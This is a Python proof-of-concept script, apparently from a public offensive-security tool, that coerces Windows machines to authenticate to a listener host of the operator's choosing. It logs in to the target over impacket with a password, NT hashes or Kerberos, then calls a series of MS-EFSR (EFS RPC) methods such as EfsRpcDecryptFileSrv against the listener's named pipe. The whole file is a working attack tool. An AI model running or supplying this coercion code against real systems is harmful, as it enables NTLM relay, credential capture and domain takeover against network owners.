#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : coerce_poc.py
# Author             : Podalirius (@podalirius_)
# Date created       : 22 Jun 2022
# Edited by          : Prepouce (@Prepouce_)

import argparse
import RPC_functions.RPC_MS_EFSR
import sys
from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY



if __name__ == '__main__':
    print("Windows auth coerce using MS-EFSR::EfsRpcDecryptFileSrv()\n")
    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-EFSR::EfsRpcDecryptFileSrv()")

    parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
    parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
    parser.add_argument("-d", "--domain", default="", help="Windows domain name to authenticate to the endpoint.")
    parser.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH", help="NT/LM hashes (LM hash can be empty)")
    parser.add_argument("--no-pass", action="store_true", help="Don't ask for password (useful for -k)")
    parser.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line")
    parser.add_argument("--dc-ip", action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
    parser.add_argument("--target-ip", action="store", metavar="ip address", help="IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it")
    parser.add_argument("-n","--namedpipe", default="coerced", help="Specify the custom name of the NamedPipe (ex: c0erc3d)")

    parser.add_argument("listener", help="IP address or hostname of listener")
    parser.add_argument("target", help="IP address or hostname of target")

    options = parser.parse_args()
    
    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash, nthash = '', ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass

        options.password = getpass("Password:")

    protocol = RPC_functions.RPC_MS_EFSR.MS_EFSR()

    connected = protocol.connect(
        username=options.username,
        password=options.password,
        domain=options.domain,
        lmhash=lmhash,
        nthash=nthash,
        target=options.target,
        doKerberos=options.kerberos,
        dcHost=options.dc_ip,
        targetIp=options.target_ip
    )

    if connected:
        protocol.EfsRpcEncryptFileSrv(options.listener,options.namedpipe)
        protocol.EfsRpcDecryptFileSrv(options.listener,options.namedpipe)
        protocol.EfsRpcQueryUsersOnFile(options.listener,options.namedpipe)
        protocol.EfsRpcQueryRecoveryAgents(options.listener,options.namedpipe)
        protocol.EfsRpcFileKeyInfo(options.listener,options.namedpipe)
        protocol.EfsRpcDuplicateEncryptionInfoFile(options.listener,options.namedpipe)
        protocol.EfsRpcFileKeyInfoEx(options.listener,options.namedpipe) #Don't work for now (rpc_x_bad_stub_data)
        protocol.EfsRpcAddUsersToFileEx(options.listener,options.namedpipe) #Don't work for now (rpc_x_bad_stub_data)
        protocol.EfsRpcFileKeyInfoEx(options.listener,options.namedpipe) #Don't work for now (rpc_x_bad_stub_data)
        
    sys.exit()
